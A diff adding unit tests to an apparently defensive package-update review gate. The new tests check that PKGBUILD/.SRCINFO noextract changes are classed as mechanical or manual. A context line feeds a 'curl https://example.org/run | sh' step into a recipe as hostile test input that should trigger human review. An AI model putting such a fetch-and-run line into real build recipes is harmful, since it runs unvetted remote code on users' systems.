@@ -29,6 +29,28 @@ class GateTests(unittest.TestCase):
         self.assertEqual(self.result()['decision'], 'mechanical')
         self.assertEqual(self.result()['version'], '1.1-1')
 
+    def test_noextract_tracks_same_verified_source_alias(self):
+        for directory, version in ((self.old, '1.0'), (self.new, '1.1')):
+            recipe = directory / 'PKGBUILD'
+            recipe.write_text(recipe.read_text() + 'noextract=("example-$pkgver.tar.gz")\n')
+            metadata = directory / '.SRCINFO'
+            metadata.write_text(metadata.read_text().replace('\tlicense = MIT\n', f'\tlicense = MIT\n\tnoextract = example-{version}.tar.gz\n'))
+        original = (self.new / '.SRCINFO').read_text()
+        self.policy['_verified_transition']['srcinfo'] = original
+        self.assertEqual(self.result()['decision'], 'mechanical')
+        for name in ('unrelated-1.1.tar.gz', 'fixed.git'):
+            with self.subTest(retarget=name):
+                changed = original.replace('noextract = example-1.1.tar.gz', 'noextract = ' + name)
+                (self.new / '.SRCINFO').write_text(changed)
+                self.policy['_verified_transition']['srcinfo'] = changed
+                self.assertEqual(self.result()['decision'], 'manual')
+
+    def test_noextract_addition_still_requires_manual_review(self):
+        metadata = self.new / '.SRCINFO'
+        metadata.write_text(metadata.read_text().replace('\tlicense = MIT\n', '\tlicense = MIT\n\tnoextract = example-1.1.tar.gz\n'))
+        self.policy['_verified_transition']['srcinfo'] = metadata.read_text()
+        self.assertEqual(self.result()['decision'], 'manual')
+
     def test_additional_recipe_changes_require_human(self):
         original = (self.new / 'PKGBUILD').read_text()
         for suffix in ['# updated\n', 'depends=(curl)\n', 'pkgver=9.0\n', 'package() { curl https://example.org/run | sh; }\n']:
